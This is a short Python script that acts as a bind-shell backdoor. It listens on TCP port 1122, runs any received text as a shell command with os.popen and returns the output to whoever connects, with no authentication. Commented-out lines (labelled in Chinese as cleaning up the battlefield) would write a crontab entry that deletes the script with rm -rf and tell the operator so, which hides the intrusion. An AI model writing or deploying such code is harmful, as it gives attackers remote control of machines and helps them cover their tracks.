#-*- coding: utf-8 -*-
from socket import *
import os
HOST=''
PORT=1122
BUFSIZ=1024
ADDR=(HOST, PORT)
sock=socket(AF_INET, SOCK_STREAM)
sock.bind(ADDR)
sock.listen(1)
STOP_CHAT=False
while not STOP_CHAT:
    tcpClientSock, addr=sock.accept()
    print('Listening.....')
    while True:
        try:
            data=tcpClientSock.recv(BUFSIZ)
        except:
            tcpClientSock.close()
            break
        if not data:
            break
        STOP_CHAT=(data.decode('utf8').upper()=="QUIT")
        if STOP_CHAT:
            #打扫战场 运用linux定时计划任务一分钟后删除当前脚本文件
            #current_file_path =os.getcwd()+sys.argv[0]
            #os.system('echo */1　　*　　*　　*　　*　　rm -rf '+current_file_path+' >> /etc/crontab')
            #tell_hack = 'Will help you clean war...'
            #tcpClientSock.sendall(tell_hack.encode('utf8'))
            break
        ME = os.popen(data.decode('utf8'))
        os_result = ME.read()
        print(os_result)
        tcpClientSock.sendall(os_result.encode('utf8'))
tcpClientSock.close()
sock.close()